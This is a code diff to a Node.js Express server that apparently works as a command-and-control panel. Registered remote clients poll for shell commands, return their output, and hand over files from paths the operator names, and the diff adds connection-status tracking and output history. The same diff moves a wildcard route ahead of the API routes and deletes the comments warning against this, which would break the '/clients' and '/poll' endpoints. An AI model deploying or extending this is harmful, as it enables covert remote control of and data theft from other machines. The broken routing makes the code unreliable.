@@ -13,11 +13,28 @@ if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
 if (!fs.existsSync('downloads')) fs.mkdirSync('downloads');
 
 // ---------- State ----------
-const clients = new Map();
-const clientOutputs = new Map();
+const clients = new Map(); // clientId -> { cwd, env, tasks, lastTaskId, connected, pendingDownload, lastSeen }
+const clientHistory = new Map(); // clientId -> [{ timestamp, output }]
 let latestCommand = { id: 0, cmd: '' };
 const selectedInclude = new Set();
 const selectedExclude = new Set();
+
+// ---------- Constants ----------
+const DISCONNECT_THRESHOLD = 10000; // 10 seconds
+
+// ---------- Helper ----------
+function getTargetClients(targets) {
+  if (!targets || targets.length === 0) {
+    return Array.from(clients.keys());
+  }
+  return targets.filter(id => clients.has(id));
+}
+
+function getClientStatus(client) {
+  if (!client.lastSeen) return 'unknown';
+  const elapsed = Date.now() - client.lastSeen;
+  return elapsed > DISCONNECT_THRESHOLD ? 'disconnected' : 'connected';
+}
 
 // ---------- Embedded HTML ----------
 const html = `<!DOCTYPE html>
@@ -38,6 +55,9 @@ const html = `<!DOCTYPE html>
     .system { color: #3af; }
     .command { color: #5f5; }
     .lineCheckbox { margin-top: 2px; cursor: pointer; }
+    .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+    .status-connected { background: #0f0; }
+    .status-disconnected { background: #f55; }
     ::-webkit-scrollbar { width: 8px; }
     ::-webkit-scrollbar-track { background: #1a1a1a; }
     ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
@@ -119,8 +139,9 @@ const html = `<!DOCTYPE html>
     let commandHistory = [];
     let historyIndex = -1;
     let lastCtrlClickedCheckbox = null;
-    let pollInterval = null;
+    let allClients = [];
 
+    // Radio buttons
     document.querySelectorAll('input[name="selMode"]').forEach(radio => {
       radio.addEventListener('change', (e) => {
         if (e.target.checked) {
@@ -137,7 +158,7 @@ const html = `<!DOCTYPE html>
     function updateSelectedList() {
       const el = document.getElementById('selectedList');
       if (selectionMode === 'none') {
-        el.textContent = 'Mode: None — all clients targeted via normal input';
+        el.textContent = 'Mode: None — all clients targeted';
       } else if (selectionMode === 'include') {
         if (selectedUUIDs.size === 0) el.textContent = 'Selected (include): none — command will go nowhere';
         else el.textContent = 'Selected (include): ' + Array.from(selectedUUIDs).join(', ');
@@ -179,11 +200,9 @@ const html = `<!DOCTYPE html>
         checkbox.addEventListener('change', (e) => {
           const id = e.target.dataset.uuid;
           if (selectionMode === 'include') {
-            if (e.target.checked) selectedUUIDs.add(id);
-            else selectedUUIDs.delete(id);
+            if (e.target.checked) selectedUUIDs.add(id); else selectedUUIDs.delete(id);
           } else if (selectionMode === 'exclude') {
-            if (e.target.checked) excludedUUIDs.add(id);
-            else excludedUUIDs.delete(id);
+            if (e.target.checked) excludedUUIDs.add(id); else excludedUUIDs.delete(id);
           }
           updateSelectedList();
         });
@@ -245,9 +264,12 @@ const html = `<!DOCTYPE html>
       try {
         const res = await fetch('/clients');
         const data = await res.json();
+        allClients = data.clients;
         terminal.innerHTML = '';
         for (const client of data.clients) {
-          const text = client.id + ': ' + (client.output || 'No output');
+          const statusClass = client.status === 'connected' ? 'status-connected' : 'status-disconnected';
+          const statusDot = '<span class="status-dot ' + statusClass + '"></span>';
+          const text = statusDot + '[' + client.id + '] ' + (client.cwd || '/') + ' > ' + (client.output || 'No output');
           const cls = client.output && client.output.toLowerCase().includes('error') ? 'error' : '';
           appendLine(text, cls);
         }
@@ -276,6 +298,7 @@ const html = `<!DOCTYPE html>
       }
     }
 
+    // Keyboard
     input.addEventListener('keydown', evt => {
       if (evt.key === 'Enter') {
         const val = input.value.trim();
@@ -304,6 +327,7 @@ const html = `<!DOCTYPE html>
       }
     });
 
+    // Upload
     document.getElementById('uploadBtn').addEventListener('click', async () => {
       const fileInput = document.getElementById('uploadFileInput');
       if (!fileInput.files || fileInput.files.length === 0) {
@@ -328,6 +352,7 @@ const html = `<!DOCTYPE html>
       }
     });
 
+    // Download
     document.getElementById('downloadBtn').addEventListener('click', async () => {
       const remotePath = document.getElementById('downloadPath').value.trim();
       if (!remotePath) {
@@ -354,6 +379,7 @@ const html = `<!DOCTYPE html>
       }
     });
 
+    // Clear selections
     document.getElementById('clearBtn').addEventListener('click', () => {
       selectedUUIDs.clear();
       excludedUUIDs.clear();
@@ -362,6 +388,7 @@ const html = `<!DOCTYPE html>
       updateSelectedList();
     });
 
+    // Init
     document.querySelectorAll('.lineCheckbox').forEach(cb => { cb.disabled = true; });
     updateSelectedList();
     setInterval(fetchClients, 1000);
@@ -370,11 +397,12 @@ const html = `<!DOCTYPE html>
 </body>
 </html>`;
 
-// ---------- IMPORTANT: API routes must come BEFORE wildcard routes ----------
-// Serve HTML for root, master, and any client view (wildcard)
-// But we need to define API routes first.
+// ---------- Routes ----------
+app.get('/', (req, res) => res.send(html));
+app.get('/master', (req, res) => res.send(html));
+app.get('/:uuid', (req, res) => res.send(html));
 
-// API Routes
+// ---------- Client registration ----------
 app.post('/register', (req, res) => {
   const clientId = uuidv4();
   clients.set(clientId, {
@@ -383,18 +411,21 @@ app.post('/register', (req, res) => {
     tasks: [],
     lastTaskId: 0,
     connected: true,
-    pendingDownload: null
+    pendingDownload: null,
+    lastSeen: Date.now()
   });
-  clientOutputs.set(clientId, '');
+  clientHistory.set(clientId, []);
   res.json({ clientId });
 });
 
+// ---------- Client polling ----------
 app.get('/poll', (req, res) => {
   const clientId = req.query.clientId;
   if (!clientId || !clients.has(clientId)) {
     return res.status(400).json({ error: 'Invalid client' });
   }
   const client = clients.get(clientId);
+  client.lastSeen = Date.now();
   let task = null;
   if (client.tasks && client.tasks.length > 0) {
     task = client.tasks.shift();
@@ -405,17 +436,22 @@ app.get('/poll', (req, res) => {
   res.json({ task: task || null });
 });
 
+// ---------- Client result ----------
 app.post('/result', (req, res) => {
   const { clientId, taskId, output, fileData } = req.body;
   if (!clientId || !clients.has(clientId)) {
     return res.status(400).json({ error: 'Invalid client' });
   }
   const client = clients.get(clientId);
+  client.lastSeen = Date.now();
   if (taskId && taskId > client.lastTaskId) {
     client.lastTaskId = taskId;
   }
   if (output !== undefined) {
-    clientOutputs.set(clientId, output);
+    const history = clientHistory.get(clientId) || [];
+    history.push({ timestamp: Date.now(), output });
+    if (history.length > 100) history.shift(); // limit
+    clientHistory.set(clientId, history);
   }
   if (fileData) {
     const filename = 'download_' + Date.now() + '_' + clientId + '.bin';
@@ -426,14 +462,28 @@ app.post('/result', (req, res) => {
   res.json({ ok: true });
 });
 
+// ---------- Serve downloads ----------
+app.use('/downloads', express.static('downloads'));
+
+// ---------- Get clients (for UI) ----------
 app.get('/clients', (req, res) => {
   const list = [];
   for (const [id, client] of clients) {
-    list.push({ id, output: clientOutputs.get(id) || '', cwd: client.cwd || '/' });
+    const history = clientHistory.get(id) || [];
+    const lastOutput = history.length > 0 ? history[history.length - 1].output : '';
+    const status = getClientStatus(client);
+    list.push({
+      id,
+      output: lastOutput,
+      cwd: client.cwd || '/',
+      status,
+      history: history.slice(-10) // last 10 entries
+    });
   }
   res.json({ clients: list });
 });
 
+// ---------- Send command ----------
 app.post('/command', (req, res) => {
   const { cmd, targets } = req.body;
   if (!cmd) return res.status(400).json({ error: 'No command' });
@@ -448,6 +498,7 @@ app.post('/command', (req, res) => {
   res.json({ ok: true });
 });
 
+// ---------- Upload file ----------
 app.post('/upload', upload.single('file'), (req, res) => {
   const file = req.file;
   if (!file) return res.status(400).json({ error: 'No file' });
@@ -465,6 +516,7 @@ app.post('/upload', upload.single('file'), (req, res) => {
   res.json({ ok: true });
 });
 
+// ---------- Download request ----------
 app.post('/download-request', (req, res) => {
   const { path: remotePath, targets } = req.body;
   if (!remotePath) return res.status(400).json({ error: 'No path' });
@@ -477,14 +529,6 @@ app.post('/download-request', (req, res) => {
   }
   res.json({ ok: true });
 });
-
-app.use('/downloads', express.static('downloads'));
-
-// ---------- HTML routes (must be after API routes) ----------
-app.get('/', (req, res) => res.send(html));
-app.get('/master', (req, res) => res.send(html));
-// This wildcard route should be LAST
-app.get('/:uuid', (req, res) => res.send(html));
 
 // ---------- Start server ----------
 const PORT = process.env.PORT || 8080;
